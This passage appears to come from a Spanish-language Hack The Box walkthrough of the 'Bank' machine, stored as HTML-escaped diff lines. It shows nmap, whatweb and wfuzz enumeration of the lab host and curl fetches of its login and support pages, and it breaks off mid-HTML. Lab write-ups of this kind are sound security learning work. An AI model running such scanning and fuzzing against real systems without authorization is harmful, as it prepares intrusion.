-|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| dns-nsid: 
-|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
-80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;16.63 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos el puerto 80 abierto, por lo que antes de visualizar el contenido vía web, vamos a ver a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.29/
-http://10.10.10.29/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.29], Title[Apache2 Ubuntu Default Page: It works]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que nos encontramos con la página default de Apache2. Algo que vemos es que se encuentra abierto el puerto 53, por lo que podríamos pensar que se está aplicando &lt;strong&gt;&lt;em&gt;Virtual hosting&lt;/em&gt;&lt;/strong&gt;; asi que dentro de nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; vamos a agregar la dirección IP con el dominio &lt;strong&gt;bank.htb&lt;/strong&gt; y cargar la página bajo dicho dominio a ver si vemos otra cosa.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos encontramos con un panel de login en el cual podríamos tratar de hace inyecciones SQL, Padding Oracle Attack, fuerza bruta, etc. Sin embargo, no nos va a funcionar. Algo que podemos notar es que se tiene el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt;; por lo tanto podríamos tratar de descubrir más recursos de extensión php:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7322 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ.php
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://bank.htb/FUZZ.php
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                         
-=====================================================================
-
-000000014:   403        10 L     30 W       279 Ch      &quot;http://bank.htb/.php&quot;                                          
-000000053:   200        51 L     125 W      1974 Ch     &quot;login&quot;                                                         
-000000055:   302        83 L     186 W      3291 Ch     &quot;support&quot;                                                       
-^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
-
-Total time: 7.929055
-Processed Requests: 374
-Filtered Requests: 371
-Requests/sec.: 47.16829
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; que tiene un código de estado 302, así que aplicaremos el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L&lt;/code&gt; para ver a donde nos redirige.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ.php
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://bank.htb/FUZZ.php
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                         
-=====================================================================
-
-000000001:   200        51 L     125 W      1974 Ch     &quot;# directory-list-2.3-medium.txt&quot;                               
-000000003:   200        51 L     125 W      1974 Ch     &quot;# Copyright 2007 James Fisher&quot;                                 
-000000007:   200        51 L     125 W      1974 Ch     &quot;# license, visit http://creativecommons.org/licenses/by-sa/3.0/
-                                                        &quot;                                                               
-000000015:   200        51 L     125 W      1974 Ch     &quot;index&quot;                                                         
-000000014:   403        10 L     30 W       279 Ch      &quot;http://bank.htb/.php&quot;                                          
-000000013:   200        51 L     125 W      1974 Ch     &quot;#&quot;                                                             
-000000012:   200        51 L     125 W      1974 Ch     &quot;# on atleast 2 different hosts&quot;                                
-000000002:   200        51 L     125 W      1974 Ch     &quot;#&quot;                                                             
-000000011:   200        51 L     125 W      1974 Ch     &quot;# Priority ordered case sensative list, where entries were foun
-                                                        d&quot;                                                              
-000000010:   200        51 L     125 W      1974 Ch     &quot;#&quot;                                                             
-000000009:   200        51 L     125 W      1974 Ch     &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;           
-000000008:   200        51 L     125 W      1974 Ch     &quot;# or send a letter to Creative Commons, 171 Second Street,&quot;    
-000000006:   200        51 L     125 W      1974 Ch     &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot; 
-000000005:   200        51 L     125 W      1974 Ch     &quot;# This work is licensed under the Creative Commons&quot;            
-000000004:   200        51 L     125 W      1974 Ch     &quot;#&quot;                                                             
-000000053:   200        51 L     125 W      1974 Ch     &quot;login&quot;                                                         
-000000055:   200        51 L     125 W      1974 Ch     &quot;support&quot;                                                       
-^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
-
-Total time: 8.147257
-Processed Requests: 373
-Filtered Requests: 356
-Requests/sec.: 45.78227
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Si nos fijamos en la cantidad de caracteres del recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt; vemos que son lo mismo; por lo que es posible que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; nos redirija a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt; y lo podemos comprar vía web. Aquí lo que nos importa es ver el contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt;, así que vamos a hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://bank.htb/login.php
-                                                                                                                                 
-&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;       
-&amp;lt;html&amp;gt;                                                                                                                           
-  &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;           
-    &amp;lt;title&amp;gt;HTB Bank - Login&amp;lt;/title&amp;gt;                                                                                              
-    &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;width=device-width, initial-scale=1.0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Bootstrap &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   
-    &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/css/bootstrap.min.css&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; styles &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;           
-    &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/css/theme/styles.css&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
-  &amp;lt;/head&amp;gt;                                                       
-  &amp;lt;body &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;login-bg&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    
-    &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;header&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                        
-       &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                  
-          &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-             &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;col-md-12&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Logo &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logo&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                   &amp;lt;h1&amp;gt;&amp;lt;a &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.html&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;HTB Bank&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt;
-                &amp;lt;/div&amp;gt;
-             &amp;lt;/div&amp;gt;                                             
-          &amp;lt;/div&amp;gt;     
-       &amp;lt;/div&amp;gt;                                                   
-  &amp;lt;/div&amp;gt;                                                        
-                                
-  &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;page-content container&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      
-    &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                           
-      &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;col-md-4 col-md-offset-4&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                     
-        &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;login-wrapper&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                              
-              &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;box&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                  
-                  &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content-wrap&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                      &amp;lt;h6&amp;gt;Login&amp;lt;/h6&amp;gt;                                                                                             
-                                            &amp;lt;form &lt;span class=&quot;nv&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt; action&amp;gt;
-                        &amp;lt;input &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;inputEmail&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;E-mail address&quot;&lt;/span&gt; required&amp;gt;
-                        &amp;lt;input &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;inputPassword&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password&quot;&lt;/span&gt; required&amp;gt;
-                        &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                            &amp;lt;input &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;btn btn-primary signup&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt; /&amp;gt;
-                        &amp;lt;/div&amp;gt;
-                      &amp;lt;/form&amp;gt;                 
-                  &amp;lt;/div&amp;gt;
-              &amp;lt;/div&amp;gt;                                                                                                             
-          &amp;lt;/div&amp;gt;                                                
-      &amp;lt;/div&amp;gt;                                                                                                                     
-    &amp;lt;/div&amp;gt;                                                      
-  &amp;lt;/div&amp;gt;
-    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; jQuery &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;necessary &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Bootstrap&lt;span class=&quot;s1&quot;&gt;'s JavaScript plugins) --&amp;gt;
-    &amp;lt;script src=&quot;https://code.jquery.com/jquery.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
-    &amp;lt;!-- Include all compiled plugins (below), or include individual files as needed --&amp;gt;
-    &amp;lt;script src=&quot;./assets/js/js/bootstrap.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
-    &amp;lt;script src=&quot;./assets/js/theme/custom.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
-  &amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;#
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://bank.htb/support.php                                                                                            
-                                
-&amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;col-sm-5&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                          
-    &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel panel-primary&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                    &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel-heading&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-            &amp;lt;h3 &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;font-size: 20px;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;My Tickets&amp;lt;/h3&amp;gt;                                                                         
-        &amp;lt;/div&amp;gt;                                                  
-        &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel-body&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                     &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content-box-large&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                      &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel-body&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                 
-                            &amp;lt;table &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;table table-bordered&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
-                                &amp;lt;thead&amp;gt;       
-                                    &amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                         
-                                        &amp;lt;th&amp;gt;#&amp;lt;/th&amp;gt;
-                                        &amp;lt;th&amp;gt;Title&amp;lt;/th&amp;gt;
-                                        &amp;lt;th&amp;gt;Message&amp;lt;/th&amp;gt;                                                                                                                 &amp;lt;th&amp;gt;Attachment&amp;lt;/th&amp;gt;                                                                      
-                                        &amp;lt;th&amp;gt;Actions&amp;lt;/th&amp;gt;
-                                    &amp;lt;/tr&amp;gt;
-                                &amp;lt;/thead&amp;gt;
-                                &amp;lt;tbody&amp;gt;
-                                                                &amp;lt;/tbody&amp;gt;
-                            &amp;lt;/table&amp;gt;
-                        &amp;lt;/div&amp;gt;
-                    &amp;lt;/div&amp;gt;
-                &amp;lt;/div&amp;gt;
-    &amp;lt;/div&amp;gt;                     
-&amp;lt;/div&amp;gt;
-&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; New Ticket &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;col-sm-5&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-    &amp;lt;section &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                                
-        &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel-body&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                 
-            &amp;lt;form &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;new_ticket&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;new_ticket&quot;&lt;/span&gt; accept-charset&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;enctype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                                                                
-                &amp;lt;label&amp;gt;Title&amp;lt;/label&amp;gt;                    
-                &amp;lt;input required &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Title&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ticket_title&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;backgr
-ound-repeat: repeat; background-image: none; background-position: 0% 0%;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                &amp;lt;br&amp;gt;                                                                                                             
-                                                                                                                                 
